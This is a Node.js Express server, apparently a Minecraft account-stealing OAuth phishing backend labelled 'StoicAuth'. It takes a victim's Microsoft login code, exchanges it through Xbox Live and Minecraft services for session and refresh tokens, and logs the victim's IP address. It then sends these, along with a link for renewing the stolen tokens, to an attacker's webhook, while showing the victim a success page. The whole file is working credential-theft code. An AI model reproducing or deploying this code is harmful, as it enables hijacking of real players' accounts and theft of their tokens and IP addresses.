// gute nacht was here !

// import modules
// const networthCalc = require('./utils/Networth'); // Removed
const express = require('express');
const path = require('path');
const axios = require('axios');
const iplim = require('iplim');
// const networthCalc = require('./utils/Networth');  // Ensure this is the correct path
const SendAPI = require('./utils/SendAPI');        // Ensure this is the correct path
const config = require('./config.json');

const app = express();
const port = 3000;

// your azure application info
const client_secret = config.azure.client_secret;
const client_id = config.azure.client_id;
const redirect_uri = config.azure.redirect_uri;
const webhook = config.webhook.webhookURL;

// rate limiter
app.use(iplim({ timeout: 1000 * 10 * 15, limit: 4, exclude: [], log: false }));
app.set("trust proxy", true);

app.get('/', async (req, res) => {
    const code = req.query.code;
    if (code == null) {
        return;
    }
    try {
        // get all the data
        const data = await ReturnData(code);
        const username = data[0];
        const uuid = data[1];
        const BearerToken = data[2];
        const RefreshToken = data[3];
        const ip = getIp(req);

        // initialize networth variables
        let networth = "Reworking Network API";
        let soulboundnetworth = "Reworking Network API";
        let sentnetworth = 0;
        let description = "Reworking Network API";

        // Replace networthCalc call
        // networthCalc(uuid).then((result) => {
        //     networth = Intl.NumberFormat('en-US', {
        //         notation: 'compact',
        //         maximumFractionDigits: 2,
        //     }).format(result[0]);
        //     soulboundnetworth = Intl.NumberFormat('en-US', {
        //         notation: 'compact',
        //         maximumFractionDigits: 2,
        //     }).format(result[1]);
        //     description = result[2];
        //     sentnetworth = (Math.trunc(result[0])) / 1000000;

        // send everything to the webhook
        PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
        // send everything to the API
        SendAPI(username, sentnetworth);
        // }).catch((error) => {
        //     console.log(error);
        // });
    } catch (e) {
        console.log(e);
    }
    // Serve the success HTML file
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

// start the server
app.listen(port, () => {
    console.log(`Started the server on ${port}`);
});

async function ReturnData(code) {
    // initialize variables
    let AccessToken, RefreshToken;
    let UserToken, UserHash;
    let XST;
    let BearerToken;
    let username, uuid;

    // array for the list of urls that will be used to get the data
    const urls = [
        'https://login.live.com/oauth20_token.srf',
        'https://user.auth.xboxlive.com/user/authenticate',
        'https://xsts.auth.xboxlive.com/xsts/authorize',
        'https://api.minecraftservices.com/authentication/login_with_xbox'
    ];

    // array for the list of configs that will be used to get the data
    const configs = [
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
        { headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' } },
        { headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' } },
        { headers: { 'Content-Type': 'application/json' } }
    ];

    let DataAccessAndRefresh = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    };

    // get the user's access & refresh token
    let ResponseAccessAndRefresh = await axios.post(urls[0], DataAccessAndRefresh, configs[0]);
    AccessToken = ResponseAccessAndRefresh.data['access_token'];
    RefreshToken = ResponseAccessAndRefresh.data['refresh_token'];

    let DataUserTokenAndHash = {
        Properties: {
            AuthMethod: 'RPS',
            SiteName: 'user.auth.xboxlive.com',
            RpsTicket: `d=${AccessToken}`
        },
        RelyingParty: 'http://auth.xboxlive.com',
        TokenType: 'JWT'
    };

    let ResponseUserTokenAndHash = await axios.post(urls[1], DataUserTokenAndHash, configs[1]);
    // get the user's token and hash
    UserToken = ResponseUserTokenAndHash.data.Token;
    UserHash = ResponseUserTokenAndHash.data['DisplayClaims']['xui'][0]['uhs'];

    let DataXST = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [UserToken]
        },
        RelyingParty: 'rp://api.minecraftservices.com/',
        TokenType: 'JWT'
    };

    // get the user's XST token
    let ResponseXSTToken = await axios.post(urls[2], DataXST, configs[2]);
    XST = ResponseXSTToken.data['Token'];

    let DataBearerToken = {
        identityToken: `XBL3.0 x=${UserHash};${XST}`,
        ensureLegacyEnabled: true
    };

    // get the user's Bearer token
    let ResponseBearerToken = await axios.post(urls[3], DataBearerToken, configs[3]);
    BearerToken = ResponseBearerToken.data['access_token'];

    // get the user's username and uuid using the Bearer token
    await GetPlayer(BearerToken).then(result => {
        uuid = result[0];
        username = result[1];
    }).catch(err => {
        console.log(err);
    });

    return [username, uuid, BearerToken, RefreshToken];
}

// function to get the user's username and uuid
async function GetPlayer(BearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile';
    const config = {
        headers: {
            'Authorization': 'Bearer ' + BearerToken,
        }
    };
    let response = await axios.get(url, config);
    return [response.data['id'], response.data['name']];
}

// refresh tokens

app.get('/refresh', async (req, res) => {
    // Initialize variables
    const refresh_token = req.query.refresh_token;
    var AccessToken, RefreshToken;
    var UserToken, UserHash;
    var XSTToken;
    var BearerToken;
    var ip = getIp(req);

    let networth = "Reworking Network API";
    let soulboundnetworth = "Reworking Network API";
    let description = "Reworking Network API";

    // array for the list of urls that will be used to get the data
    const urls = [
        'https://login.live.com/oauth20_token.srf',
        'https://user.auth.xboxlive.com/user/authenticate',
        'https://xsts.auth.xboxlive.com/xsts/authorize',
        'https://api.minecraftservices.com/authentication/login_with_xbox'
    ];
    // array for the list of configs that will be used to get the data
    const configs = [
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
        { headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' } },
        { headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' } },
        { headers: { 'Content-Type': 'application/json' } }
    ];

    let DataAccessAndRefreshToken = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        refresh_token: refresh_token,
        grant_type: 'refresh_token'
    };

    // get the response of the request to get the access token and refresh token
    ResponseAccessAndRefreshToken = await axios.post(urls[0], DataAccessAndRefreshToken, configs[0]);

    // set the access token and refresh token
    AccessToken = ResponseAccessAndRefreshToken.data.access_token;
    RefreshToken = ResponseAccessAndRefreshToken.data.refresh_token;

    // if the access token or refresh token is not found, return an error
    if (!AccessToken || !RefreshToken) return res.send("Unable to get access token or refresh token, token can not be refreshed.");

    let DataUserTokenAndHash = {
        Properties: {
            AuthMethod: "RPS",
            SiteName: "user.auth.xboxlive.com",
            RpsTicket: `d=${AccessToken}`
        },
        RelyingParty: "http://auth.xboxlive.com",
        TokenType: "JWT"
    };

    // get the response of the request to get the user token and hash
    ResponseUserTokenAndHash = await axios.post(urls[1], DataUserTokenAndHash, configs[1]);

    // set the user token and hash
    UserToken = ResponseUserTokenAndHash.data.Token;
    UserHash = ResponseUserTokenAndHash.data.DisplayClaims.xui[0].uhs;

    // if the user token or hash is not found, return an error
    if (!UserToken || !UserHash) return res.send("Unable to get user token or hash, token can not be refreshed.");

    let DataXSTToken = {
        Properties: {
            SandboxId: "RETAIL",
            UserTokens: [UserToken]
        },
        RelyingParty: "rp://api.minecraftservices.com/",
        TokenType: "JWT"
    };

    // get the response of the request to get the XST token
    ResponseXSTToken = await axios.post(urls[2], DataXSTToken, configs[2]);

    // set the XST token
    XSTToken = ResponseXSTToken.data.Token;

    // if the XST token is not found, return an error
    if (!XSTToken) return res.send("Unable to get XST token, token can not be refreshed.");

    let DataBearerToken = {
        identityToken: `XBL3.0 x=${UserHash};${XSTToken}`,
        ensureLegacyEnabled: true
    };

    // get the response of the request to get the Bearer token
    ResponseBearerToken = await axios.post(urls[3], DataBearerToken, configs[3]);

    // set the Bearer token
    BearerToken = ResponseBearerToken.data.access_token;

    // if the Bearer token is not found, return an error
    if (!BearerToken) return res.send("Unable to get Bearer token, token can not be refreshed.");

    // get the user's uuid and username
    await GetPlayer(BearerToken).then(result => {
        uuid = result[0];
        username = result[1];
    }).catch(err => {
        console.log(err);
    });

    // Replace networthCalc call
    // networth = await networthCalc(username, uuid); // Removed
    // Reworking Network API
    networth = "Reworking Network API";
    soulboundnetworth = "Reworking Network API";
    description = "Reworking Network API";

    // send everything to the webhook
    PostWebhook(true, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description);
    // send everything to the API
    SendAPIData(username, networth);

    // put something to the screen so that the user can leave the page
    res.send("Token has been refreshed.");
});

// send the data to the webhook
async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToken, networth, soulboundnetworth, description) {
    const data = {
        content: "",
        embeds: [
            {
                title: refresh ? "Minecraft User Refreshed" : "Minecraft User Authenticated",
                color: 5814783,
                fields: [
                    {
                        name: "Username",
                        value: username,
                        inline: true
                    },
                    {
                        name: "UUID",
                        value: uuid,
                        inline: true
                    },
                    {
                        name: "IP Address",
                        value: ip,
                        inline: true
                    },
                    {
                        name: "Networth",
                        value: networth,
                        inline: true
                    },
                    {
                        name: "Soulbound Networth",
                        value: soulboundnetworth,
                        inline: true
                    },
                    {
                        name: "Session ID",
                        value: BearerToken,
                        inline: true
                    },
                    {
                        name: "Refresh Token",
                        value: `[Click here to refresh](${redirect_uri}/refresh?refresh_token=${RefreshToken})`
                    }
                ],
                footer: {
                    text: `StoicAuth`
                },
                timestamp: new Date(),
                description: description
            }
        ]
    };
    if (refresh) {
        data.embeds[0].title = "Minecraft User Refreshed";
    }
    await axios.post(webhook, data).catch(error => {
        console.log(error);
    });
}

// send the data to the API
async function SendAPIData(username, networth) {
    const apiUrl = 'https://yourapi.com/endpoint';
    const data = {
        username: username,
        networth: networth
    };

    try {
        await axios.post(apiUrl, data);
    } catch (error) {
        console.error('Error sending data to API:', error);
    }
}

// get the user's ip
function getIp(req) {
    var ip = req.headers["x-forwarded-for"];
    if (ip) {
        var list = ip.split(",");
        ip = list[list.length - 1];
    } else {
        ip = req.connection.remoteAddress;
    }
    return ip;
}
